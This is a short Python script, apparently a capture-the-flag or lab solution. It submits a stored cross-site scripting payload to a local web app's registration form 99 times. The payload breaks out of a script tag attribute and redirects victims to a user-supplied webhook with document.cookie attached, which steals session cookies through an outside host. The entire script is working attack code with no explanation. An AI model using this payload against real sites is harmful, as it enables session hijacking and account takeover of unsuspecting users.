from itsdangerous import base64_encode
import requests as r 
url = input("Add you webhook URL\n")

data= {
    "email":"hellobozo@gmail.com",
    "essay":""
}
data['essay']="""<script id='welcome' src="/static/js/thing.js" data-iloveumass="hi');document.location=
'"""+url+"""?value='%2Bdocument.cookie;//"></script>"""
print(data['essay'])
for i in range(1,100):
    r1=r.post("http://127.0.0.1:8000/register",data=data)
    print(r1.text + str(i))
